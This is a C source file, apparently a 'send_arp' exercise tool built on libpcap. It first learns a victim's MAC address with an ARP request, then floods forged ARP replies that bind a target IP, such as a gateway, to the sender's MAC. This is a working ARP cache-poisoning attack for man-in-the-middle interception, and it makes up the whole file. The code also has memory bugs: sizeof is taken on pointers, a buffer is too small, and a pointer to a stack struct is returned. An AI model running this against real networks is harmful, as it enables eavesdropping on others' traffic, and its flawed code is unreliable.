#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/in.h>
#include <netinet/ether.h> 
#include <net/ethernet.h> 
#include <string.h> 
#include <sys/types.h> 
#include <sys/socket.h> 
#include <sys/ioctl.h> 
#include <net/if.h> 
#include <netinet/in.h> 
#include <arpa/inet.h> 
#include <stdlib.h> 
#include <stdio.h>
#include <net/if_arp.h>
#include <pcap.h>

void usage() {
	printf("syntax: send_arp <interface> <sender_ip> <target_ip>\n");
	printf("sample: send_arp eth0 192.168.10.10 192.168.10.1\n");
}

unsigned char* getMyMacaddr(char* dev);
unsigned char* IPstr2char(char* IPstr);
char* getMyIP(char* dev);

unsigned char MACbroadcast[] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
unsigned char MACno[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
unsigned char ETHERNET[] = {0x00, 0x01};
unsigned char ETHERTYPE[] = {0x08, 0x06};
unsigned char IPV4[] = {0x08, 0x00};
unsigned char ARPSIZE = 0x06;
unsigned char ARPREQUEST[] = {0x00, 0x01}; 
unsigned char HWSIZE = 0x06;
unsigned char PROTOCOLSIZE = 0x04;
unsigned char ARPREPLY[] = {0x00, 0x02};

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char* sendip = argv[2];
	char* targetip = argv[3];

	struct ifreq ifr;
	unsigned char* myIP;
	unsigned char* myMAC;
	unsigned char* senderIP;
	unsigned char* targetIP;
	unsigned char senderMAC[6];
	struct ethhdr *sender_ehdr;
	unsigned char* sendpacket = (unsigned char*)malloc(42);
	char errbuf[PCAP_ERRBUF_SIZE];
	
	int i, j;


	senderIP = IPstr2char(sendip);
	myIP = (unsigned char *)getMyIP(dev);
	myMAC = getMyMacaddr(dev);
	targetIP = IPstr2char(targetip);
	myIP = IPstr2char((char*)myIP);

	memcpy(sendpacket, MACbroadcast, sizeof(MACbroadcast));
	memcpy(sendpacket+0x06, myMAC, sizeof(myMAC));
	memcpy(sendpacket+0x0c, ETHERTYPE, sizeof(ETHERTYPE));
	memcpy(sendpacket+0x0e, ETHERNET, sizeof(ETHERNET));
	memcpy(sendpacket+0x10, IPV4, sizeof(IPV4));
	memcpy(sendpacket+0x12, &HWSIZE, sizeof(HWSIZE));
	memcpy(sendpacket+0x13, &PROTOCOLSIZE, sizeof(PROTOCOLSIZE));
	memcpy(sendpacket+0x14, ARPREQUEST, sizeof(ARPREQUEST));
	memcpy(sendpacket+0x16, myMAC, sizeof(myMAC));
	memcpy(sendpacket+0x1c, myIP, sizeof(myIP)); 
	memcpy(sendpacket+0x20, MACno, sizeof(MACno));	
	memcpy(sendpacket+0x26, senderIP, sizeof(senderIP));
	
	pcap_t *fp;

	fp= pcap_open_live(dev, 65535, 0, 1000, errbuf);
	pcap_sendpacket(fp, sendpacket, 42); 

	while(true) {
		const u_char* packet;
		struct pcap_pkthdr* header;
		int res = pcap_next_ex(fp, &header, &packet);
		myMAC = getMyMacaddr(dev);
		if(packet[0x0c]==0x08 && packet[0x0d]== 0x06 && packet[0x14]==0x00 && packet[0x15]==0x02 && packet[0]==myMAC[0] && packet[1]==myMAC[1] && packet[2]==myMAC[2] && packet[3]==myMAC[3] && packet[4]==myMAC[4] && packet[5]==myMAC[5]) {
		for(i=0; i<6; i++) {
			senderMAC[i] = packet[0x16+i];
		}
		break;
		}
	}
	memset(sendpacket, 0, sizeof(sendpacket));
	myMAC = getMyMacaddr(dev);

	memcpy(sendpacket, senderMAC, sizeof(senderMAC));
	memcpy(sendpacket+0x06, myMAC, sizeof(myMAC));
	memcpy(sendpacket+0x0c, ETHERTYPE, sizeof(ETHERTYPE));
	memcpy(sendpacket+0x0e, ETHERNET, sizeof(ETHERNET));
	memcpy(sendpacket+0x10, IPV4, sizeof(IPV4));
	memcpy(sendpacket+0x12, &HWSIZE, sizeof(HWSIZE));
	memcpy(sendpacket+0x13, &PROTOCOLSIZE, sizeof(PROTOCOLSIZE));
	memcpy(sendpacket+0x14, ARPREPLY, sizeof(ARPREPLY));
	memcpy(sendpacket+0x16, myMAC, sizeof(myMAC));
	memcpy(sendpacket+0x1c, targetIP, sizeof(targetIP)); 
	memcpy(sendpacket+0x20, senderMAC, sizeof(senderMAC));	
	memcpy(sendpacket+0x26, senderIP, sizeof(senderIP));

	while(true) {
		pcap_sendpacket(fp, sendpacket, 42);
		//printf("send OK\n");
	}


	return 0;
}

unsigned char* getMyMacaddr(char* dev) {
	struct ifreq ifr;
	unsigned char* MACaddr=(unsigned char*)malloc(6);
	int sock = socket(AF_INET, SOCK_STREAM, 0);

	strcpy(ifr.ifr_name, dev);
	ioctl(sock, SIOCGIFHWADDR, &ifr);
	
	MACaddr = (unsigned char*)ifr.ifr_hwaddr.sa_data;
	return MACaddr;
}

unsigned char* IPstr2char(char* IPstr) {
	unsigned char* IPchar = (unsigned char*)malloc(4);
	char* token;
	int i=0;
	token = strtok(IPstr, ".");

	while(token != NULL) {
		IPchar[i] = atoi(token);
		token = strtok(NULL, ".");
		i++;
	}

	return IPchar;
}

char* getMyIP(char* dev) {
	struct ifreq ifr;
	char* IPaddr = (char*)malloc(4);
	int sock = socket(AF_INET, SOCK_STREAM, 0);

	strcpy(ifr.ifr_name, dev);
	ioctl(sock, SIOCGIFADDR, &ifr);

	inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, IPaddr, sizeof(struct sockaddr));

	return IPaddr;
}
